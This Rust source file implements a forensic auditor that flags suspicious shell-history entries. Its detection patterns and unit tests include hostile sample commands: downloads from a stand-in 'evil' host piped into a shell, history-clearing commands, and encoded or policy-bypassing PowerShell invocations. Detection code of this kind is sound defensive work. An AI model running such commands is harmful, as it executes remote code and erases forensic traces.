//! `shellhist-forensic` — graded anomaly auditor over shell command history.
//!
//! Consumes [`shellhist_core::HistoryEntry`] streams and emits
//! [`forensicnomicon::report::Finding`]s. Every anomaly is an **observation**
//! ("consistent with …"); the examiner draws the conclusions. MITRE techniques
//! are narrated as consistency, never as a verdict.

#![forbid(unsafe_code)]

use forensicnomicon::report::{Category, Finding, Observation, Severity, Source};
use shellhist_core::HistoryEntry;

/// A graded shell-history anomaly.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HistAnomaly {
    /// A surviving command that disables or clears history (the clearing itself
    /// was recorded). MITRE T1070.003.
    HistoryDisabled { command: String },
    /// A timestamped entry whose epoch precedes its predecessor's — non-monotonic
    /// history, consistent with injected or back-dated entries.
    TimestampRegression { at: i64, previous: i64 },
    /// A download piped straight into a shell interpreter. MITRE T1059 / T1105.
    RemoteExecPipe { command: String },
    /// A PowerShell encoded/obfuscated command line. MITRE T1059.001 / T1027.
    PwshEncodedCommand { command: String },
}

impl HistAnomaly {
    /// The stable, published anomaly code (scheme-prefixed SCREAMING-KEBAB).
    #[must_use]
    pub fn code(&self) -> &'static str {
        match self {
            Self::HistoryDisabled { .. } => "SHELLHIST-HISTORY-DISABLED",
            Self::TimestampRegression { .. } => "SHELLHIST-TIMESTAMP-REGRESSION",
            Self::RemoteExecPipe { .. } => "SHELLHIST-REMOTE-EXEC-PIPE",
            Self::PwshEncodedCommand { .. } => "SHELLHIST-PWSH-ENCODED-CMD",
        }
    }
}

impl Observation for HistAnomaly {
    fn severity(&self) -> Option<Severity> {
        Some(match self {
            Self::HistoryDisabled { .. }
            | Self::TimestampRegression { .. }
            | Self::RemoteExecPipe { .. }
            | Self::PwshEncodedCommand { .. } => Severity::Medium,
        })
    }

    fn code(&self) -> &'static str {
        HistAnomaly::code(self)
    }

    fn category(&self) -> Category {
        match self {
            Self::HistoryDisabled { .. } => Category::Concealment,
            Self::TimestampRegression { .. } => Category::Integrity,
            Self::RemoteExecPipe { .. } | Self::PwshEncodedCommand { .. } => Category::Threat,
        }
    }

    fn note(&self) -> String {
        match self {
            Self::HistoryDisabled { command } => format!(
                "the command {command:?} disables or clears shell history; consistent with \
                 anti-forensic history tampering (MITRE T1070.003)"
            ),
            Self::TimestampRegression { at, previous } => format!(
                "an entry timestamped {at} follows one timestamped {previous} (history went \
                 backwards in time); consistent with injected or back-dated entries"
            ),
            Self::RemoteExecPipe { command } => format!(
                "the command {command:?} downloads and pipes content directly into a shell; \
                 consistent with remote payload execution (MITRE T1059 / T1105)"
            ),
            Self::PwshEncodedCommand { command } => format!(
                "the command {command:?} uses an encoded or policy-bypassing PowerShell \
                 invocation; consistent with obfuscated execution (MITRE T1059.001 / T1027)"
            ),
        }
    }
}

/// The [`Source`] stamp for findings this analyzer emits.
#[must_use]
pub fn source(scope: impl Into<String>) -> Source {
    Source {
        analyzer: "shellhist-forensic".to_string(),
        scope: scope.into(),
        version: Some(env!("CARGO_PKG_VERSION").to_string()),
    }
}

/// Audit a history-entry stream for anomalies.
#[must_use]
pub fn audit(entries: &[HistoryEntry]) -> Vec<HistAnomaly> {
    let mut out = Vec::new();
    let mut last_ts: Option<i64> = None;

    for entry in entries {
        let cmd = entry.command.as_str();
        if is_history_disable(cmd) {
            out.push(HistAnomaly::HistoryDisabled {
                command: cmd.to_string(),
            });
        }
        if is_remote_exec_pipe(cmd) {
            out.push(HistAnomaly::RemoteExecPipe {
                command: cmd.to_string(),
            });
        }
        if is_pwsh_encoded(cmd) {
            out.push(HistAnomaly::PwshEncodedCommand {
                command: cmd.to_string(),
            });
        }
        if let Some(ts) = entry.timestamp {
            if let Some(prev) = last_ts {
                if ts < prev {
                    out.push(HistAnomaly::TimestampRegression {
                        at: ts,
                        previous: prev,
                    });
                }
            }
            last_ts = Some(ts);
        }
    }
    out
}

/// Convenience: audit and convert directly to graded [`Finding`]s.
#[must_use]
pub fn audit_findings(entries: &[HistoryEntry], scope: impl Into<String>) -> Vec<Finding> {
    let src = source(scope);
    audit(entries)
        .iter()
        .map(|a| a.to_finding(src.clone()))
        .collect()
}

fn is_history_disable(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    const NEEDLES: &[&str] = &[
        "unset histfile",
        "set +o history",
        "history -c",
        "histfile=/dev/null",
        "clear-history",
    ];
    if NEEDLES.iter().any(|n| c.contains(n)) {
        return true;
    }
    (c.contains("ln -sf /dev/null") || c.contains("ln -s /dev/null")) && c.contains("history")
        || (c.contains("rm ") && c.contains("_history"))
        || (c.contains("remove-item") && c.contains("consolehost_history"))
}

fn is_remote_exec_pipe(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    let downloads = c.contains("curl ") || c.contains("wget ");
    let into_shell = c.contains("| sh")
        || c.contains("|sh")
        || c.contains("| bash")
        || c.contains("|bash")
        || c.contains("| zsh")
        || c.contains("|zsh");
    if downloads && into_shell {
        return true;
    }
    // PowerShell one-liner downloaders.
    (c.contains("downloadstring") || c.contains("downloadfile"))
        && (c.contains("iex") || c.contains("invoke-expression"))
        || ((c.contains("base64 -d") || c.contains("base64 --decode")) && into_shell)
}

fn is_pwsh_encoded(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    c.contains("-encodedcommand")
        || c.contains("-enc ")
        || c.ends_with("-enc")
        || c.contains("executionpolicy bypass")
        || (c.contains("frombase64string")
            && (c.contains("iex") || c.contains("invoke-expression")))
}

#[cfg(test)]
mod tests {
    use super::*;
    use shellhist_core::{HistoryEntry, Shell};

    fn entry(cmd: &str, ts: Option<i64>) -> HistoryEntry {
        HistoryEntry {
            shell: Shell::Bash,
            command: cmd.into(),
            timestamp: ts,
            elapsed: None,
            paths: vec![],
        }
    }

    fn codes(a: &[HistAnomaly]) -> Vec<&str> {
        a.iter().map(HistAnomaly::code).collect()
    }

    #[test]
    fn benign_history_fires_nothing() {
        let h = [
            entry("ls -la", Some(100)),
            entry("cd /tmp", Some(101)),
            entry("git status", Some(102)),
        ];
        assert!(audit(&h).is_empty());
    }

    #[test]
    fn history_clearing_is_flagged() {
        for cmd in [
            "unset HISTFILE",
            "set +o history",
            "history -c",
            "export HISTFILE=/dev/null",
            "Clear-History",
        ] {
            let a = audit(&[entry(cmd, None)]);
            assert!(
                codes(&a).contains(&"SHELLHIST-HISTORY-DISABLED"),
                "missed: {cmd}"
            );
        }
    }

    #[test]
    fn timestamp_regression_is_flagged() {
        let h = [entry("a", Some(200)), entry("b", Some(150))]; // went backwards
        let a = audit(&h);
        assert!(codes(&a).contains(&"SHELLHIST-TIMESTAMP-REGRESSION"));
        // Monotonic history does not regress.
        assert!(!codes(&audit(&[entry("a", Some(1)), entry("b", Some(2))]))
            .contains(&"SHELLHIST-TIMESTAMP-REGRESSION"));
    }

    #[test]
    fn download_pipe_to_shell_is_flagged() {
        for cmd in [
            "curl http://evil/x.sh | sh",
            "wget -qO- http://evil | bash",
            "curl http://x|sh",
        ] {
            assert!(
                codes(&audit(&[entry(cmd, None)])).contains(&"SHELLHIST-REMOTE-EXEC-PIPE"),
                "missed: {cmd}"
            );
        }
        // A plain curl that saves to disk is not a pipe-to-shell.
        assert!(!codes(&audit(&[entry("curl -o x.sh http://x", None)]))
            .contains(&"SHELLHIST-REMOTE-EXEC-PIPE"));
    }

    #[test]
    fn pwsh_encoded_command_is_flagged() {
        for cmd in [
            "powershell -EncodedCommand ZQBjAGgAbwA=",
            "pwsh -enc ZQBj",
            "powershell -ExecutionPolicy Bypass -File x.ps1",
        ] {
            assert!(
                codes(&audit(&[entry(cmd, None)])).contains(&"SHELLHIST-PWSH-ENCODED-CMD"),
                "missed: {cmd}"
            );
        }
    }

    #[test]
    fn findings_are_hedged_observations_never_verdicts() {
        let f = audit_findings(&[entry("curl http://x | sh", None)], "test");
        assert_eq!(f.len(), 1);
        let note = f[0].note.to_ascii_lowercase();
        assert!(note.contains("consistent with"), "must hedge: {note}");
        for forbidden in ["proves", "confirms", "definitely"] {
            assert!(
                !note.contains(forbidden),
                "must not assert a verdict: {note}"
            );
        }
    }
}
